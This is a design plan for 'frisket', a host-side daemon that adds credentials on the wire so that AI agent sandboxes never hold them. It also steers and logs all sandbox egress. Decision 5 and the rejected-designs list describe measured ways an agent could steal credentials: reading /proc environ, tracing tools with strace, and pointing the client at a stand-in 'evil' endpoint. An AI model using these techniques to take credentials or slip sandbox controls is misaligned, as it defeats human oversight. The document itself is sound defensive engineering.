# frisket — plan

> A *frisket* is the mask on a printing press that covers the parts of the sheet
> which must not take ink. flong casts the plate; frisket decides what the sheet
> is allowed to take.

frisket keeps credentials out of sandboxes. It runs on the host, holds the
tokens, and is where a sandbox's credentials come from — added to requests on
the wire, where the sandbox cannot reach them. For a sandbox with no network of
its own it is also the only way out, and every connection it sees is logged.

Nothing in a sandbox is configured to use it. The kernel steers connections to
it: no proxy variables, no hosts file, no per-tool settings for egress. The one
thing a sandbox is told is which certificate authority to trust.

Its first consumer is the agent containers in
[nix-config](https://github.com/danielbodart/nix-config), which run Claude Code
and codex inside [flong](https://github.com/danielbodart/flong). frisket itself
knows nothing about nspawn, flong or agents.

Status: planning. Nothing is built. Everything below that says *measured* was
run on this machine; everything else is a decision waiting on code.

---

## Locked decisions

**1. Go, standard library first, with one dependency.** `CGO_ENABLED = 0`, so
the binary is static. The stdlib covers almost all of it: `httputil.ReverseProxy`
for credential routes, `crypto/tls` and `crypto/x509` for interception, `net`
and `io.Copy` for egress (splice on Linux, in both directions between a TCP and
a unix socket — measured), `crypto/rsa` for RS256, and a `syscall` route to
`SO_ORIGINAL_DST` for both families (IPv4 through `GetsockoptIPv6Mreq`, IPv6
through `GetsockoptIPv6MTUInfo` at `IP6T_SO_ORIGINAL_DST`, because `Mreq`
truncates a `sockaddr_in6` — measured).

It does not cover DNS, and the allowlist is enforced at frisket's DNS, so
frisket parses hostile DNS. The rule, in order: use the stdlib; where it falls
short and the gap is not closable with a small amount of simple code, take the
most battle-tested library; judge that library by what it drags in behind it;
never hand-roll a parser for complicated hostile input to keep the dependency
count at zero.

That makes `golang.org/x/net/dns/dnsmessage` the one dependency. The package
imports `errors` and nothing else, and `net/dnsclient.go` in the standard
library imports it, so every Go binary using the pure-Go resolver already runs
this code. It enforces what a hand-rolled parser forgets: a 254-byte name limit,
a pointer-loop limit, the reserved label prefixes, and names containing dots.

`vendorHash` is therefore a pinned hash and not `null`. That is a cost, not a
loss: `vendorHash = null` is a nice property, never a security one.

**2. One unix socket per session is how every sandbox reaches frisket.**
Whatever network the sandbox has, frisket traffic never crosses it. The socket
is bound into that sandbox alone, and it is the capability: nothing inside the
sandbox — relay, rules, configuration — needs to be trusted.

**3. Steering, not proxy configuration.** nspawn creates the sandbox's network
namespace as it does today (`--private-network`). Once it is running, the
launcher — root on the host — enters that namespace by the container's leader
pid and installs the nftables rules and, for a sandbox with no network, a dummy
interface. Matching connections are redirected to an in-sandbox relay, which
prefixes each one with where it was going (PROXY protocol v2, from
`SO_ORIGINAL_DST`) and hands it to the socket. frisket routes by that original
destination. Nothing guesses a protocol.

Nothing in the session is ever root and nothing needs `CAP_NET_ADMIN`: the rules
are installed from outside, and the namespace is owned by the initial user
namespace, so the workload's uid cannot change them (measured: a non-owner uid
gets `EPERM` on list, flush, route and sysctl). `CAP_NET_ADMIN` can be dropped
from the container outright.

The ordering this creates is the price: nspawn starts the workload as soon as
the namespace exists. The relay wrapping the command is the barrier — it waits
for frisket to confirm steering is installed before it execs the workload, on
the same socket handshake that is the session's lease. A barrier that is not
asserted is a barrier that is not there, so it gets a test of its own.

A tool that ignores proxy settings is not a special case: it is steered like
everything else, and appears in the log whether it is allowed or refused.

**4. Interception by exception.** frisket terminates TLS for the hosts it adds
credentials to, and for nothing else. Every other connection is an opaque splice
to its original destination.

This is what makes the rest of the design simple. Tools keep their ordinary
configuration and talk to their real endpoints; frisket adds the credential on
the wire. No per-tool base URL, no placeholder token, no `insteadOf`, no
`HF_ENDPOINT`, no undocumented environment variables, and no gap for the
endpoints a tool hard-codes.

- The certificate authority is generated per machine, held by frisket, and
  trusted only inside sandboxes. Whoever holds that key can impersonate any site
  *to a sandbox*, which is the blast radius to keep in mind.
- Which hosts are intercepted is decided by frisket's DNS: an intercepted name
  resolves to frisket's service address. There is no second list to keep.
- Clients that pin certificates are spliced through, by name, and get no
  credential.
- frisket sees plaintext for intercepted hosts. It logs metadata, never bodies.

**5. A credential never enters a sandbox.** Not as a file, not in the
environment, not through a socket the sandbox can ask twice. This is a stronger
rule than the earlier plan's, and it is what closes the attacks that defeat
every in-sandbox scheme. Measured on this machine:

- A child process can read its parent's `/proc/<pid>/environ`, so stripping
  variables from children hides nothing.
- Claude Code's own `Read` tool runs in-process, so a credential materialised
  in memory for that process is materialised for the agent.
- An agent can trace the tool it runs (`strace -e read` on a child prints the
  file the tool just read), so no wrapper protects a credential the tool holds.
- An agent can run the real binary against its own endpoint
  (`ANTHROPIC_BASE_URL=http://evil claude`), so no allowlist of arguments helps.

Consequently the only credential an agent can use is one it cannot take: added
by frisket, to a request frisket has authorised. Going around frisket reaches
the real host *without* a credential, so a bypass costs the agent its
credentials rather than winning it anything. The cost of a bypass is a gap in
the log, not a leak.

Where a tool genuinely cannot work this way, frisket mints a short-lived, narrow
token and hands it over exactly once per session, before the workload can act. A
second request on that socket is refused.

**6. Every route authorises the request it is injecting into.** The relay's
PROXY header is attacker-controlled — killing the relay and writing to the
socket directly reaches the same place — so routing is by original destination
and scope is enforced by frisket against the real request line: repository, path
prefix, method. Client-side scoping is convenience, never a boundary: git's
`insteadOf` is a longest-prefix string rewrite, so `owner/repo` also matches
`owner/repo-evil`. A route that cannot produce its credential fails the request
loudly; it never proceeds uncredentialed.

**7. Three layers, each ignorant of the next.**

- **flong** gives a sandbox a network and a hook around its lifecycle. It knows
  nothing about frisket.
- **frisket** is the daemon, the relay, and steering expressed as a script over
  a namespace. It knows nothing about launchers.
- **The adapter** maps frisket onto flong's hooks. It ships as
  `frisket.nixosModules.flong` from day one, tested in frisket's own CI against
  a pinned flong, because it is the layer where the security properties actually
  meet and nothing else tests it.

Agent policy — tiers, trusted checkouts, workspace groups, the agent wrappers —
is a fourth thing and stays in nix-config. The printing name for it, if it is
ever extracted, is **chase**: the frame that locks the type together so the page
can be printed.

**8. Authorise by socket, never by peer uid.** Without a uid namespace every
process on both sides is the same uid, so `SO_PEERCRED` says nothing. A
session's identity and policy are fixed when its socket is created, by root,
before the sandbox starts.

**9. frisket runs as the user whose credentials it holds**, hardened by systemd
(`ProtectSystem=strict`, `ProtectHome=read-only` with only the credential files
and its own state reachable), not as a `DynamicUser`. It must read credential
files that change under it, and create sockets the sandbox's uid can connect to;
a `DynamicUser` can do neither. It holds nothing that user does not already
have.

**10. frisket reads the host's credentials and never refreshes them.** The agent
logins are rotated by host-tier sessions, and a second refresher would race
them — codex's refresh tokens are single-use. frisket re-reads a credential file
when it changes, watching the directory, because these files are written by
temp-file-and-rename. When the token it holds is stale it answers 503, not 401:
a client retries a 503 with backoff and recovers in the same turn, where two
401s fail the turn (measured against Claude Code). Who refreshes when no host
session is running is an open question.

**11. Separate repository from day one.** nix-config declares
`github:danielbodart/frisket` and builds locally with
`--override-input frisket path:/home/dan/Projects/frisket` (explicitly `path:`,
so untracked files are included). The override is never written to
`flake.lock`, so no local path can be committed. Push frisket first, then
`nix flake update frisket` in nix-config.

---

## Considered and rejected

Recorded so they are not re-proposed without new information.

- **Proxy environment variables, `/etc/hosts` and low ports.** The original
  design. Every tool needed configuring, with quirks, and a tool that ignored
  them failed silently with no log line. Steering removes all of it. Note the
  asymmetry that decided it, and that now favours a trusted CA: a missing proxy
  variable fails open and silently; a missing CA fails closed and loudly.
- **A base URL and a placeholder token per tool.** The earlier answer to
  credentials, abandoned when the per-tool evidence came in: `gh` has no usable
  plain-HTTP base URL (the `github.localhost` route needs frisket's DNS *and* a
  matching git remote), most of Claude Code's authenticated traffic goes to
  hard-coded hosts a base URL cannot redirect, subscription mode through a
  custom base URL needs an undocumented internal variable, and codex needs a
  placeholder `auth.json` of JWT-shaped tokens. Interception needs none of it.
- **One port, protocol sniffing.** Routing by the first byte of a connection.
  Rejected as dishonest; routing is by original destination.
- **A veth pair, or any declaration-derived addressing.** flong runs many
  concurrent sessions from one container declaration, and `hostAddress` /
  `localAddress` / `forwardPorts` are static per container: two sessions would
  claim the same address, and the host cannot route one address to two
  interfaces. This is why flong's refusal of those options is permanent and not
  a to-do. It also avoids exposing the host on every address, which was the
  original reason.
- **flong pre-creating the namespace and handing it over with
  `--network-namespace-path`.** It fights nspawn: `lo` is not brought up,
  `--resolv-conf=auto` copies the host's file in and truncates whatever is
  mounted there, `CAP_NET_ADMIN` returns to the bounding set, and a pinned
  namespace file must be unmounted and swept. Entering the namespace nspawn
  already made costs an ordering barrier and nothing else.
- **A privileged pid 1 inside the sandbox that sets up and drops.** What the
  nixpkgs container module does. It undoes flong's "nothing in a session is
  root" and needs the capability we would immediately remove.
- **SOCKS and `LD_PRELOAD` shims.** Database drivers and gRPC do not speak
  SOCKS, and a `connect()` shim misses static Go binaries, which make their own
  syscalls. ottergate ships exactly this shim, which is why its containment
  depends on iptables underneath it.
- **Keeping a credential in the sandbox and guarding access to it.**
  agents-container implements this thoroughly — root-owned token files, a
  setuid-root wrapper, a vault daemon that checks the caller's `/proc/<pid>/exe`
  and walks the process ancestry, and a guard script that blocks
  `gh auth token`. It still writes the real token into a temp
  `GH_CONFIG_DIR` the agent's own uid can read, its guard script is traceable by
  the agent, and its ancestry check permits every interpreter an agent uses.
  Decision 5 records why this class of design cannot hold.
- **Hand-rolling the DNS parser to keep zero dependencies.** ottergate does
  this in 296 stdlib-only lines. It has a remotely reachable panic that kills
  the daemon, and it parses a wire label containing dots into a name that
  impersonates an allowlisted host in the audit log. Both reproduced.
- **DNSSEC validation in frisket.** ottergate's takes the key out of the
  response it is validating, proves nothing, and breaks resolution for unsigned
  zones on its own allowlist. If upstream integrity matters, use DoT or DoH to a
  validating resolver and keep 0x20 encoding for the local hop.
- **Zig and Bun.** Zig's std has, to our knowledge, no RSA signing and no
  use-after-free protection; Bun's HTTP servers cannot do CONNECT and it parses
  hostile input in younger native code.

---

## What it is protecting

nix-config's two container tiers, as they will be. The host tier has no
container and no frisket, and is out of scope.

| | trusted | strict (research on someone else's code) |
|---|---|---|
| Goal | credentials never leak | the same, and nothing local is reachable |
| Network | a real one, through pasta | none: loopback and a dummy route |
| Steered | DNS, and frisket's service address | everything |
| Intercepted | the credential hosts, chosen by DNS | the same |
| Other egress | direct, unread, logged by name at DNS | none; frisket is the only way out |
| Policy | full credentials; host and LAN reachable | public hosts only; model APIs only |
| Workspace | read-write | read-only overlay, writes discarded |
| Agent state | shared | vanilla agents; only this project's transcripts persist |

Keeping credentials out does not depend on the network. Nothing long-lived ever
enters, and nothing enters at all except a minted token where a tool leaves no
choice. So trusted gets a real network stack — databases, gRPC, UDP, QUIC and
emulators all work — and the private namespace is there to close the host's
loopback and abstract sockets and to make steering possible, not to filter.

For strict, nothing in the sandbox is worth stealing. What steering everything
still keeps out is the host's loopback, the LAN, and the host's own addresses.

Two things to be honest about in the trusted tier. A sandbox can skip frisket's
DNS and connect to a literal address, which costs it the credential and costs
the log a line. And a host service bound to a non-loopback address — a docker
bridge, for instance — is reachable through pasta, as it would be through a
veth. Neither is a credential leak. Both are recorded rather than claimed away.

The workspace overlay and the vanilla agent state are flong work, not frisket's,
and the tier table is a target until they exist.

---

## Architecture

```
flong      gives the sandbox a namespace and a hook around its lifecycle:
             nspawn makes it; root enters it from the host once it is running
             (generic; knows nothing about frisket)

steering   installed by root, in the sandbox's namespace, before the barrier lifts:
             nftables redirects the chosen set -> relay -> frisket socket
             each connection prefixed with its original destination (PROXY v2)

frisket    on the host, one socket per session; routes by original destination:
             - frisket's service address -> its own services
                 DNS:   answered here; an intercepted name resolves to this address
                 HTTPS: terminated with the sandbox's CA, credential added, scope
                        enforced, forwarded upstream over a real TLS connection
             - anything else               -> egress
                 policy by address, named where possible, logged,
                 then an opaque splice to the original destination
```

```
host                                         sandbox network namespace
----                                         -------------------------
frisket serve                                nftables (root, from the host, after start)
  control.sock <-- adapter: new session         redirect set --> relay
  ca/                                        frisket relay -- <workload>
  sessions/<id>/                               waits for steering, then execs
    frisket.sock <----- bind-mounted ------>    TCP listener  -+
    tokens/                                     DNS listener  -+-> frisket.sock
```

### Components

**`frisket serve`** — the host daemon. A control socket creates a session with a
named policy and parameters, and returns its directory, which is what gets bound
into the sandbox. Sessions are collected when their lease closes.

**`frisket steer <netns> --set <set>`** — installs the ruleset, addresses and
routes in a namespace, idempotently, and fails loudly. One attrset produces both
these rules and the relay's arguments, so the ports cannot drift apart.

**`frisket relay -- <command>`** — starts its listeners, waits for the session
socket to confirm steering, then execs the workload. For each connection it
reads `SO_ORIGINAL_DST`, writes a PROXY v2 header, and copies bytes; DNS is
forwarded in its TCP form (RFC 7766). It parses nothing else, and its integrity
does not matter — killing it and listening instead reaches the same socket.

**`frisket mint <service>`** — a client for the one-shot handout, talking to the
socket directly, so the sandbox needs no curl.

### Redirect sets

- **`all`** — for a sandbox with no network. Every non-loopback TCP connection
  and all DNS go to the relay. The namespace also needs a dummy interface with a
  default route *and a non-link-local address per family*: with a route alone,
  IPv4 picks source `0.0.0.0` and the client resets, and IPv6 hangs until
  timeout (measured). Other UDP is rejected rather than dropped, so a QUIC
  client fails over to TCP at once instead of hanging (measured).
- **`service`** — for a sandbox with its own network. DNS and frisket's service
  address are redirected; everything else goes direct.

The ruleset's order is load-bearing and was arrived at by experiment: the DNS
redirect comes first, or a loopback resolver (`127.0.0.53`, or glibc's
`127.0.0.1` default) is never steered; the local exemption comes second; and the
filter chain matches `fib daddr type local`, because after an output-path
redirect `meta oif` is still the pre-NAT device, so the obvious `oifname "lo"`
rule silently drops the redirected DNS.

### frisket's service address

One address inside the sandbox where frisket's own services live: DNS on 53,
HTTPS on 443, HTTP on 80. It is assigned to `lo` inside the namespace so that a
missing rule fails closed with a refusal rather than being routed out
(measured). The relay listens on high ports and nftables sends traffic to it, so
nothing binds a privileged port.

It is a dedicated address, not `169.254.169.254`. A 404 at the cloud metadata
address breaks Azure's credential chain outright — it marks IMDS available,
retries for about 24 seconds and then raises an error that stops the chain — and
the Google libraries need `GCE_METADATA_HOST`, `GCE_METADATA_IP` and
`GCE_METADATA_ROOT` set anyway, because their detection paths disagree about
which to use.

### DNS

frisket answers every query it is given. A name on the session's allowlist that
is intercepted resolves to the service address; a name that is allowed but not
intercepted is resolved upstream and returned; a name that is not allowed is
refused without an upstream lookup, so it cannot leak through DNS.

Upstream queries get 0x20 encoding, a fresh random transaction id and a
connected socket per query, and a response is dropped unless its question
matches byte for byte. This is ottergate's one unambiguously good idea and it is
about forty lines.

### Egress policy

- **Structural refusal, always, and not configurable:** loopback, RFC 1918,
  link-local, CGNAT, ULA, and every address the host itself owns — computed at
  runtime from the host's interfaces and routes, not a static list. One
  classifier, built on `net/netip` and a prefix table, including the v4-mapped,
  v4-compatible, 6to4 and NAT64 spellings of a v4 address. Checked in
  `net.Dialer.Control` against the address actually being dialled, so DNS
  rebinding cannot slip past, and so no allowlist can override it. ottergate's
  allowlist is consulted *before* its equivalent check, which is why its shipped
  configuration allows the cloud metadata address.
- **Allowlist:** a connection is accepted only to an address frisket resolved
  for an allowed name in that session, with a bounded TTL and a cap on the set.
- **Names** come from frisket's own DNS answers to that session, with SNI or
  `Host` as a label where present, and the bare address otherwise. Policy never
  depends on guessing a protocol. A client that fragments its ClientHello costs
  us a log field, not a routing decision.
- **Log:** one JSON line per connection and per DNS query — session, connection
  id, policy, destination, name, bytes in and out, duration, decision. A DNS
  query and the connection it caused can be joined. A refusal, including a
  rate-limited one, is logged like anything else; a silent drop is a bug.

### Credentials

- **Injection** — the tool's own request, to its own endpoint, over TLS frisket
  terminates. frisket adds the credential, enforces the route's scope against
  the real request line, and forwards upstream over a fresh TLS connection.
- **The GCP metadata server** — served on the service address, answering
  `Metadata-Flavor: Google`, with the endpoints the four client libraries
  actually probe, which is more than the token route: `/`,
  `/computeMetadata/v1/instance`, `service-accounts/default/?recursive=true`,
  `service-accounts/?recursive=true`, `default/email`, `project/project-id`,
  `project/numeric-project-id`, `universe/universe-domain`, and `token` honouring
  `?scopes=`. Tokens come from impersonating a dedicated, narrowly-roled service
  account — never from a login that can read Secret Manager, or a short-lived
  token fetches a long-lived one.
- **Minting** — where injection cannot work, a short-lived, narrowly scoped
  token, handed over once per session. Its lifetime and scope are the
  protection.

---

## Per-tool routes

With interception, the sandbox's configuration is ordinary. What each tool needs
is a CA it trusts; what frisket needs is a route that knows how to authorise and
inject.

| Tool | What frisket does | Scope enforced on the request |
|---|---|---|
| git over HTTPS | injects a GitHub App installation token, or the user's credential | repository set from the session's workspace and its group members; push refused unless the policy allows it |
| gh | the same, on `api.github.com` | path and method against the session's repositories |
| Claude Code | swaps `Authorization` for the host's current access token on `api.anthropic.com` | inference and the first-party endpoints; nothing else |
| codex | the same on `chatgpt.com/backend-api/codex` | as above |
| hf | injects the HF token on `huggingface.co`; CDN and Xet downloads are ordinary egress, and the Xet exchange returns a short-lived token that does enter the sandbox | read scope; gated repos need `*.xethub.hf.co` and `cdn-lfs*` allowed |
| Cloudflare | injects on `api.cloudflare.com` | account and zone |
| GCP client libraries | metadata server | the service account's roles |
| gcloud | metadata server, with `GCE_METADATA_ROOT` set | as above |
| Postgres, Redis, MongoDB | no frisket involvement in trusted; unreachable in strict | — |
| npm, PyPI, crates, Go proxy | no credential — egress policy only | — |

Notes:

- A route's blast radius is its credential's real scope. A GitHub credential on
  `api.github.com` is a write channel *as you*; research on public code needs
  none, and the policy says which routes carry credentials, not just which
  destinations are reachable.
- Several of these credentials do not exist yet on this machine: there is no
  GitHub App, no gcloud installation, no Cloudflare login, and the hf token is
  outside sops. Each needs a source before its row can be built.
- The agent rows depend on decision 10: frisket holds no login of its own and
  injects what the host file currently holds.

---

## Build order

**0. Walking skeleton.** flong's hook and per-session bind; `frisket steer` over
a namespace; the relay with PROXY v2 and the barrier; frisket answering one
intercepted route through the real socket. One NixOS test covering it end to
end: steered, logged, no credential in the sandbox. This settles the socket wire
protocol, the control API and the session lease before anything is built on
them.

**1. Egress.** The classifier, `Dialer.Control`, DNS with the allowlist, the log
schema, `all` and `service`. Tested in a bare namespace and in the VM.

**2. Interception.** The CA, certificates minted per name, the splice-through
list, and the first credential routes: git and hf, which have no unknowns.

**3. Agents.** Claude Code and codex through interception, including what the
host's rotating credential files require.

**4. Metadata server and minting** — GCP, gh, Cloudflare.

**5. Integration.** The adapter against nix-config's tiers, and the mounts that
target state removes.

---

## Flake

- `packages.default` — `buildGoModule`, a pinned `vendorHash`,
  `env.CGO_ENABLED = 0`.
- `nixosModules.default` — the daemon, with a `package` option defaulting to
  this flake's build, so importing the module is enough.
- `nixosModules.flong` — the adapter, from day one.
- `lib.steering` — the ruleset and the relay's arguments, as one attrset, for
  any launcher.
- `devShells.default` — go, gopls, golangci-lint.
- `checks` — the NixOS tests, the package (`buildGoModule` runs `go test`),
  `gofmt`, and `go vet`. The Go version follows the oldest nixpkgs a consumer
  is expected to use.
- `formatter` — nixpkgs-fmt. `scripts/version.sh`, `VERSION` and the shellcheck
  gate follow flong.

The service runs as the credential owner, hardened, with `ProtectSystem=strict`
and nothing else reachable. Session sockets and their directory survive a
restart, and the daemon re-listens on them, so a `nixos-rebuild switch` does not
sever a session that has been running for hours.

---

## Test plan

**Go tests.** Unit tests, fuzz targets and property-based tests, because most of
this is a parser or a classifier facing hostile input:

- Fuzz `dnsmessage` use, the PROXY v2 reader, and the ClientHello peek. The
  PROXY v2 reader is the one parser written here rather than taken: it is a
  fixed layout with no compression or recursion, it accepts exactly two shapes,
  and it is fuzzed hardest.
- Property tests for the address classifier (a refusal is never turned into an
  acceptance by any allowlist; every spelling of an address classifies as the
  address), the allowlist matcher (`evil-google.com` never matches
  `*.google.com`; case, trailing dots and punycode), and the splice (bytes are
  preserved in both directions, including after a half-close).
- The splice waits for both directions. Closing one must not truncate the other,
  which is a bug ottergate has in both of its proxy paths.
- Deadlines are idle deadlines, extended by activity, or long downloads, SSE and
  websockets die at the timeout.
- Logs are asserted through an injected writer. A logger that silences itself
  under test cannot be tested, and then "exactly one line per connection" is a
  hope.

**NixOS tests** with a fake upstream. Nothing needs a real credential or real
network; routes carry their upstream and CA bundle as configuration so a test
can point them at the fake, and the structural deny ranges are data so a test
node's address can be used.

- Steering, `all`: only `lo` and the dummy interface; a plain `curl` with no
  proxy settings is steered, allowed and logged; a raw connection to a private
  address is refused and logged; loopback, link-local and the host's own
  addresses are refused, including its global IPv6 address; UDP 443 is rejected;
  DNS reaches frisket; a refused name triggers no upstream lookup; a connection
  to an address frisket did not resolve is refused; the workload cannot list or
  change the rules; the PROXY header's destination matches what the client
  dialled.
- Steering, `service`: only DNS and the service address reach frisket.
- The barrier: with steering deliberately delayed, the workload cannot reach the
  network, and does once it lands.
- Credentials: the sandbox holds no credential; the real one reaches the
  upstream; a route used under a policy without it gets none; an out-of-scope
  request is refused even when the PROXY header is forged; a Google client
  library fetches a token from the metadata server; an SSE response arrives
  incrementally; a large packfile streams.
- Lifecycle: a session survives a daemon restart; a SIGKILLed launcher leaves
  nothing behind.

**Everywhere:** every connection and query produces exactly one log line.

---

## Required changes elsewhere

**flong** — generic, agent-agnostic:

- **A root hook after the namespace exists and before the workload is useful**,
  with the machine name, the namespace, the uid and the resolved workspace in
  scope, able to add binds of its own.
- **A teardown hook**, called from cleanup and from the SIGKILL sweep. The sweep
  currently globs only the current closure's cache directory, so a session from
  a superseded closure is never swept.
- **Per-session binds with source ≠ destination**, accepting files and sockets.
  `extraBinds` cannot: directories only, same path both sides, resolved as the
  caller, and advertised to the payload.
- **Capability hardening for a hooked namespace:** refuse `--capability`,
  `--ambient-capability` and `--private-users` arriving through `extraFlags`,
  and pass `--drop-capability=CAP_NET_ADMIN` and `--no-new-privileges=yes`.
  Otherwise steering is decorative.
- **`outbound`**, giving a private session the host's connectivity through
  pasta, with `--no-map-gw` and an explicit `none` for every port class, since
  they all default to `auto`. Its lifetime is the teardown hook's business.
- The veth, bridge and port options stay refused, for the concurrency reason.

**nix-config** — policy, and the mounts the target state removes:

- Define the policies and which sandbox gets which.
- Distribute frisket's CA to the runtimes in each container.
- Handpick what each tier mounts. `~/.ssh` goes once git is injected; the agent
  credential files go; `cc-socks` stays for trusted and goes for strict; the
  askpass script belongs to the host tier alone.

Strict-tier hardening that is not frisket's concern, recorded so it is not lost:
the read-only workspace overlay, vanilla agents with only `projects/<slug>`
persisted, and an io_uring syscall filter. Note that flong refuses
`privateUsers` because a bind-mounted file owned by a host uid is unreadable
inside, which the credential binds going away does not change.

---

## Open questions

1. **Who refreshes when no host session is running.** frisket never refreshes,
   so a sandbox session stalls once the host's access token expires. Hold and
   answer 503 until a host session refreshes, fail visibly, or have frisket
   prompt a refresh through the host's own tooling.
2. **Which certificates cannot be intercepted.** The splice-through list needs
   to be discovered per tool, and a pinned client should fail in a way that says
   so.
3. **Inbound to a trusted sandbox.** A dev server inside a sandbox is reachable
   from inside it, and Playwright runs there, so this is only about reaching it
   from the host's own browser. Whether that is worth a forwarder.
4. **Hugging Face gated repos** — confirm the presigned CDN and Xet paths work
   as ordinary egress, and which hosts a strict allowlist needs.
5. **pasta as root in the initial user namespace** — it drops to `nobody` before
   `setns`, so attaching may need `--runas 0` or a dedicated uid. Under
   verification.
6. **Which host ports a trusted policy allows**, and whether that list is
   per project.
